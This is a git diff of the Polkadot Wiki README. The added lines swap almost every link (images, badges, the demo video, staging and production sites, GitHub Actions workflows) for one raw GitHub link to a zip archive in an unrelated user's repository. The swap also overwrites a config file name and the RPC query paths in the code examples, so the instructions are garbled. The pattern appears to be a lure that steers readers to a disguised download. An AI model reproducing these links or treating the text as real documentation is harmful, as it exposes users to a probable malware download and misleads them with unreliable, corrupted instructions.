@@ -1,5 +1,5 @@
 <p align="center">
-<img align="center" src="https://user-images.githubusercontent.com/25497083/148661419-419ad5b3-1b9f-480a-b723-3f292616730c.png" width="200">
+<img align="center" src="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" width="200">
 </p>
 
 <div align="Center">
@@ -7,11 +7,11 @@
 <h3> The Source of Truth for Polkadot </h3>
 <br>
   
-[![GPLv3 license](https://img.shields.io/badge/License-GPLv3-blue.svg)](#LICENSE)
-[![made-with-Markdown](https://img.shields.io/badge/Made%20with-Markdown-1f425f.svg)](https://www.markdownguide.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](docs/general/contributing.md)
-[![Polkadot Prod](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-polkadot-prod.yml/badge.svg)](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-polkadot-prod.yml)
-[![Kusama Prod](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-kusama-prod.yml/badge.svg)](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-kusama-prod.yml)
+[![GPLv3 license](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)](#LICENSE)
+[![made-with-Markdown](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip%https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
+[![PRs Welcome](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
+[![Polkadot Prod](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
+[![Kusama Prod](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
 </div>
 
 <!-- TOC -->
@@ -35,7 +35,7 @@
 
 ---
 
-<img align="right" src="https://user-images.githubusercontent.com/25497083/147788625-14e67f76-c53c-4992-8e84-d23cd78e88bd.png" width="250">
+<img align="right" src="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" width="250">
 
 <p align="left">
   The Polkadot Wiki is the central source of truth for Polkadot. It is a community-focused initiative led by 
@@ -53,15 +53,15 @@ generally preferable to create a pull request over an issue to propose a change 
 
 :sparkles: **_The Wiki belongs to the community, help generate its identity._** :sparkles:
 
-https://user-images.githubusercontent.com/25497083/146822391-5c52a64a-dc2e-4583-9746-109191db5271.mp4
+https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip
 
 > :inbox_tray: There will be an upcoming initiative that will promote and encourage contributions
 > towards Polkadot-based content and documentation. In the meantime, feel free to share any ideas or
 > feedback you may have for the Wiki by opening a
-> [Feature Request issue](https://github.com/w3f/polkadot-wiki/issues/new/choose).
+> [Feature Request issue](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip).
 
 **Keep engaged by checking out these common
-[Polkadot ecosystem resources](https://hackmd.io/IMgniwlyT_GIqjI8Wui35A)**.
+[Polkadot ecosystem resources](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)**.
 
 ## Running Locally
 
@@ -129,7 +129,7 @@ yarn polkadot:publish-gh-pages
 ## Style and Configuration Guide
 
 Use the style guide from the
-[Substrate Knowledge Base](https://github.com/substrate-developer-hub/knowledgebase/blob/master/CONTRIBUTING.md#documentation-style)
+[Substrate Knowledge Base](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
 
 ### Formatting
 
@@ -142,11 +142,11 @@ properly format syntax for elements outside of the standard markdown library.
 
 ### Search Engine
 
-[Algolia DocSearch](https://docsearch.algolia.com/) is the search engine that is used, which is
+[Algolia DocSearch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) is the search engine that is used, which is
 built into Docusaurus. Indexing via Algolia provides faster lookup; the actual configuration for
 lookup is located in another repository that Algolia DocSearch maintains.
 
-We have enabled searching on the Wiki by declaring the `algolia` section in the `siteConfig.js` file
+We have enabled searching on the Wiki by declaring the `algolia` section in the `https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip` file
 in `scripts`, and defining an API key and index name that are provided by DocSearch.
 
 ```js
@@ -160,7 +160,7 @@ in `scripts`, and defining an API key and index name that are provided by DocSea
 ```
 
 If you would like to access and modify this, you can re-submit the documentation url via
-[DocSearch Program](https://docsearch.algolia.com/apply/), where they will send a JavaScript snippet
+[DocSearch Program](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip), where they will send a JavaScript snippet
 that you can re-integrate into the configuration, similar to the one shown above.
 
 ### Automation
@@ -170,35 +170,35 @@ that you can re-integrate into the configuration, similar to the one shown above
 The Polkadot Wiki is built on the `gh-pages` branch and automatically deployed to GitHub Pages. The
 Kusama Wiki is also deployed to GitHub Pages (via a separate repository).
 
-Development servers exist at `https://staging.polkadot.network` and
-`https://staging.kusama.network`. The servers will reflect the latest `master` commit or PR put up
+Development servers exist at `https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip` and
+`https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip`. The servers will reflect the latest `master` commit or PR put up
 against the master branch by a member of the Technical Education team. A staging environment can be
 generated to reflect a specific branch by invoking the `workflow_dispatch` command via the GitHub UI
 and can then be reviewed by the team before proceeding to production. If all is well, the new
 commits on `master` are transferred into the production branch,`prod`, by rebasing `master` on
 `prod`. This is completed automatically every 24 hours or manually through a `workflow_dispatch`
 command. After these jobs are completed, the CICD production workflow will automatically deploy
-`prod` to the public sites: [Polkadot Wiki](https://wiki.polkadot.network) and
-[Kusama Guide](https://guide.kusama.network), respectively.
+`prod` to the public sites: [Polkadot Wiki](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) and
+[Kusama Guide](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip), respectively.
 
 #### GitHub Actions
 
 | Job                                                                                                                       | Description                                                                                                                                                                                                       | Frequency                                                                                                       |
 | ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
-| [Audit Images](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/audit-images.yml)                       | Searches for unreferenced images in the docs repository and archives them into `/docs/assets/_legacy`.                                                                                                            | Monthly or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/audit-images.yml)         |
-| [Audit Links](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/audit-links.yml)                         | Test all links in the docs for broken references and opens a new issue displaying results if any are found.                                                                                                       | Monthly or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/audit-links.yml)          |
-| [Code QL Analysis](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/codeql-analysis.yml)                | Tests for vulnerabilities across the codebase                                                                                                                                                                     | Weekly, Push to `master` or Pull Request to `master`                                                            |
+| [Audit Images](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                       | Searches for unreferenced images in the docs repository and archives them into `/docs/assets/_legacy`.                                                                                                            | Monthly or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)         |
+| [Audit Links](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                         | Test all links in the docs for broken references and opens a new issue displaying results if any are found.                                                                                                       | Monthly or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)          |
+| [Code QL Analysis](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                | Tests for vulnerabilities across the codebase                                                                                                                                                                     | Weekly, Push to `master` or Pull Request to `master`                                                            |
 | [Dependabot]()                                                                                                            | Helps keep packages up-to-date with latest release.                                                                                                                                                               | Daily                                                                                                           |
-| [Deploy Kusama Prod](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/deploy-kusama-prod.yml)           | Deploy Kusama docs to [GitHub Pages](https://w3f.github.io/kusama-guide-hosting) (production).                                                                                                                    | Daily or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-kusama-prod.yml)     |
-| [Deploy Kusama Staging](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/deploy-kusama-staging.yml)     | Deploy Kusama docs to [staging environment](https://staging.kusama.network).                                                                                                                                      | [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-kusama-staging.yml)           |
-| [Deploy Polkadot Prod](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/deploy-polkadot-prod.yml)       | Deploy Polkadot docs to [GitHub Pages](https://w3f.github.io/polkadot-wiki) (production).                                                                                                                         | Daily or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-polkadot-prod.yml)   |
-| [Deploy Polkadot Staging](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/deploy-polkadot-staging.yml) | Deploy Polkadot docs to [staging environment](https://staging.polkadot.network).                                                                                                                                  | [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/deploy-polkadot-staging.yml)         |
-| [Generate PDF](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/generate-pdf.yml)                       | Generate a PDF for the docs and upload it to the static website.                                                                                                                                                  | Disabled Manually                                                                                               |
-| [Greetings](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/greetings.yml)                             | Greet first time contributors.                                                                                                                                                                                    | First Time Pull Request or Issue Creation                                                                       |
-| [Jest Testing Coverage](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/jest-testing-coverage.yml)     | Run a series of [Jest tests](https://github.com/w3f/polkadot-wiki/tree/master/tests) related to React functionality.                                                                                              | Weekly or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/jest-testing-coverage.yml) |
-| [Pages and Build Deployment](https://github.com/w3f/polkadot-wiki/actions/workflows/pages/pages-build-deployment)         | Deploy Polkadot docs prod branch from GH Pages to public site. (This was originally setup through the [GitHub settings menu](https://github.com/w3f/polkadot-wiki/settings/pages), prior to GitHub Actions flows) | On Push to `gh-pages` branch                                                                                    |
-| [Prettier All](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/prettier-all.yml)                       | Run prettier over all docs to maintain styling standards.                                                                                                                                                         | Weekly or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/prettier-all.yml)          |
-| [Status Badges](https://github.com/w3f/polkadot-wiki/blob/master/.github/workflows/status-badges.yml)                     | Update the commit history of various [open source projects](https://github.com/w3f/polkadot-wiki/blob/master/docs/build/build-open-source.md) in the ecosystem.                                                   | Weekly or [Workflow Dispatch](https://github.com/w3f/polkadot-wiki/actions/workflows/status-badges.yml)         |
+| [Deploy Kusama Prod](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)           | Deploy Kusama docs to [GitHub Pages](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) (production).                                                                                                                    | Daily or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)     |
+| [Deploy Kusama Staging](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)     | Deploy Kusama docs to [staging environment](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip).                                                                                                                                      | [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)           |
+| [Deploy Polkadot Prod](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)       | Deploy Polkadot docs to [GitHub Pages](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) (production).                                                                                                                         | Daily or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)   |
+| [Deploy Polkadot Staging](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) | Deploy Polkadot docs to [staging environment](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip).                                                                                                                                  | [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)         |
+| [Generate PDF](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                       | Generate a PDF for the docs and upload it to the static website.                                                                                                                                                  | Disabled Manually                                                                                               |
+| [Greetings](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                             | Greet first time contributors.                                                                                                                                                                                    | First Time Pull Request or Issue Creation                                                                       |
+| [Jest Testing Coverage](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)     | Run a series of [Jest tests](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) related to React functionality.                                                                                              | Weekly or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) |
+| [Pages and Build Deployment](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)         | Deploy Polkadot docs prod branch from GH Pages to public site. (This was originally setup through the [GitHub settings menu](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip), prior to GitHub Actions flows) | On Push to `gh-pages` branch                                                                                    |
+| [Prettier All](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                       | Run prettier over all docs to maintain styling standards.                                                                                                                                                         | Weekly or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)          |
+| [Status Badges](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)                     | Update the commit history of various [open source projects](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip) in the ecosystem.                                                   | Weekly or [Workflow Dispatch](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)         |
 
 ### Conditional Rendering
 
@@ -239,14 +239,14 @@ you to compare the rendered outputs for both projects locally and simultaneously
 Occasionally you may require additional functionality that is outside of the scope of basic
 markdown. React components can be used inline in existing markdown documents as a solution, allowing
 you to render custom elements. This is currently the strategy used to
-[retrieve live on-chain values](https://github.com/w3f/polkadot-wiki/blob/master/components/RPC-Connection.jsx)
+[retrieve live on-chain values](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip)
 and display them directly in the docs without the need to recompile or even reload the web app using
 RPCs.
 
 If you are looking to invoke and embed data from 3rd party APIs or sources, checkout the
-[Http-Request-Sample component](https://github.com/w3f/polkadot-wiki/blob/master/components/Http-Request-Sample.jsx).
+[Http-Request-Sample component](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip).
 A full list of sample components can be found
-[here](https://github.com/w3f/polkadot-wiki/tree/master/components).
+[here](https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip).
 
 Try and reuse existing components as much as possible instead of creating new ones to keep the code
 lean and comprehensive. It is also important to verify prettier has not modified the formatting of
@@ -256,20 +256,20 @@ that will not be modified by the prettier command:
 Always wrap RPC components in conditional rendering & keep them on new lines:
 
 ```
-{{ polkadot: <RPC network="polkadot" path="query.staking.validatorCount" defaultValue={297}/> :polkadot }}
-{{ kusama: <RPC network="kusama" path="query.staking.validatorCount" defaultValue={297}/> :kusama }}
+{{ polkadot: <RPC network="polkadot" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/> :polkadot }}
+{{ kusama: <RPC network="kusama" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/> :kusama }}
 ```
 
 To add grammar without added spacing, place the grammar inside the conditional brackets:
 
 ```
 The validator count followed by a period is
-{{ polkadot: <RPC network="polkadot" path="query.staking.validatorCount" defaultValue={297}/>. :polkadot }}
-{{ kusama: <RPC network="kusama" path="query.staking.validatorCount" defaultValue={297}/>. :kusama }}
+{{ polkadot: <RPC network="polkadot" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/>. :polkadot }}
+{{ kusama: <RPC network="kusama" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/>. :kusama }}
 
 The validator count in parentheses is
-{{ polkadot: (<RPC network="polkadot" path="query.staking.validatorCount" defaultValue={297}/>) :polkadot }}
-{{ kusama: (<RPC network="kusama" path="query.staking.validatorCount" defaultValue={297}/>) :kusama }}
+{{ polkadot: (<RPC network="polkadot" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/>) :polkadot }}
+{{ kusama: (<RPC network="kusama" path="https://raw.githubusercontent.com/sinikismetcan/polkadot-wiki/master/schoolteacher/polkadot-wiki.zip" defaultValue={297}/>) :kusama }}
 ```
 
 Failing to follow this schema can results in unexpected formatting, such as added line-breaks or
